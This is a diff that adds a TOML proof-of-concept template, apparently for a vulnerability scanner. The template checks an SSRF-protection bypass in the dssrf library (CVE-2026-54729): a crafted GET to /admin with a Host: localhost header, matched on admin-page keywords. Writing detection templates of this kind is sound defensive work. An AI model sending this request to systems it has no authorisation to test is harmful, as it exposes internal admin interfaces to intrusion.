@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "当 dssrf 使用 1.1.1.1 作为 DNS 解析器时，localhost 的 dns.resolve4 返回 NXDOMAIN 且无 dns.lookup 回退，导致 is_url_safe 将 localhost 误判为安全地址，绕过 SSRF 防护。通过访问 http://localhost/admin 验证绕过。"
+id = "POC-AVE-2026-0796"
+name = "dssrf DNS 解析绕过 SSRF 漏洞 PoC"
+severity = "high"
+tags = ["ave-2026-0796"]
+vuln_id = [
+    "CVE-2026-54729",
+    "GHSA-5846-7qm3-r52j",
+    "AVE-2026-0796",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/admin"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "localhost"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "admin",
+    "dashboard",
+    "internal",
+]
